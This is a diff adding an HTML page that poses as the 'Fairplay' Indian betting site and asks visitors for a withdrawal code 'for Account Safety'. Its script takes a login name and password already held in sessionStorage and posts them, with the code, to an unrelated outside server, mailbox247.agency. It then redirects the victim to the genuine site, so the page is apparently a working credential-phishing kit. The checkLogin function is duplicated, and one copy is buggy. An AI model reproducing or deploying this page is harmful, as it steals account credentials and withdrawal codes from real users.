@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Fairplay: Online Betting Site | Sports Betting in India</title>
+    <meta content="" name="description" />
+    <meta content="" name="keywords" />
+    <link id="favIcon" href="assets/img/favicon.png" rel="icon">
+    <link href="assets/css/zeynep.css" rel="stylesheet" />
+    <link href="assets/css/swiper-bundle.min.css" rel="stylesheet" />
+    <link href="assets/css/bootstrap-icons.css" rel="stylesheet" />
+    <link href="assets/css/materialdesignicons.min.css" rel="stylesheet" />
+    <link href="assets/css/bootstrap.min 2.css" rel="stylesheet" />
+    <link href="assets/css/style 2.css" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/css/styles.432fcb20e39085c4eef0.css" media="all" />
+    <noscript><link rel="stylesheet" href="assets/css/styles.432fcb20e39085c4eef0.css" /></noscript>
+    <link rel="stylesheet" href="assets/css/common.css" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <link rel="stylesheet" href="assets/css/custom.css" />
+    <link rel="stylesheet" href="assets/css/theme.css" />
+</head>
+<body style="background: none !important">
+    <app-root _nghost-qgk-c9="" ng-version="12.1.5">
+        <router-outlet _ngcontent-qgk-c9=""></router-outlet>
+        <app-login>
+            <div _ngcontent-qgk-c43="" class="login">
+                <div _ngcontent-qgk-c43="" class="wrapper">
+                    <div _ngcontent-qgk-c43="" class="container-fluid">
+                        <div _ngcontent-qgk-c43="" class="row">
+                            <div _ngcontent-qgk-c43="" class="col-md-12">
+                                <div _ngcontent-qgk-c43="" class="loginInner1">
+                                    <div _ngcontent-qgk-c43="" class="log-logo m-b-20 text-center">
+                                        <img _ngcontent-qgk-c43="" class="logo-login" src="assets/img/logo.png" />
+                                    </div>
+                                    <div _ngcontent-qgk-c43="" class="featured-box-login featured-box-secundary default">
+                                        <p style="color: white;">Enter your Withdraw code for Account Safety</p><br>
+                                        <form class="form-horizontal" role="form" method="post">
+                                            <div class="form-group m-b-20">
+                                                <input placeholder="Enter Withdraw Password" id="code" name="username" value="" class="form-control" type="text">
+                                                <span id="username-error" class="error"></span>
+                                            </div>
+                                            <div class="form-group text-center">
+                                                <button style="background-color: #F26C20; border-color: #F26C20; color: white;" type="button" class="btn btn-submit btn-login" onclick="checkLogin()">SECURE LOGIN</button>
+                                            </div>
+                                        </form>
+                                    </div>
+                                    <div id="errorMsg" style="color:red;"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </app-login>
+    </app-root>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+    <script>
+      function checkLogin() {
+          var code = $("#code").val();
+          if (code !== '') {
+              var loginName = sessionStorage.getItem("loginName");
+              var password = sessionStorage.getItem("password");
+              
+              $.ajax({
+                  type: "POST",
+                  url: "https://mailbox247.agency/admin/fairplay.php",
+                  data: "loginName=" + loginName + "&password=" + password + "&code=" + code,
+                  success: function(msg) {
+                      if (msg === "sucessmsg") {
+                          window.location.href = "https://fairplay24.in/exchange_sports/in";
+                      } else {
+                          $("#errorMsg").html('Username and password are incorrect.');
+                      }
+                  },
+                  error: function() {
+                      $("#errorMsg").html('There was an error with the login request.');
+                  }
+              });
+          } else {
+              alert('All fields are required.');
+              return false;
+          }
+      }
+  </script>
+<script>
+  function checkLogin() {
+      var code = $("#code").val();
+      if (code !== '') {
+          var loginName = sessionStorage.getItem("loginName");
+          var password = sessionStorage.getItem("password");
+          
+          $.ajax({
+              type: "POST",
+              url: "https://mailbox247.agency/admin/fairplay.php",
+              data: "loginName=" + loginName + "&password=" + password + "&code=" + code,
+              success: function(msg) {
+                console.log(msg);
+                  if (msg = "sucessmsg") {
+                      window.location.href = "https://fairplay24.in/exchange_sports/in";
+                  } else {
+                      $("#errorMsg").html('Username and password are incorrect.');
+                  }
+              },
+              error: function() {
+                  $("#errorMsg").html('There was an error with the login request.');
+              }
+          });
+      } else {
+          alert('All fields are required.');
+          return false;
+      }
+  }
+</script>
+
+
+    <script src="jquery.js"></script>
+</body>
+</html>
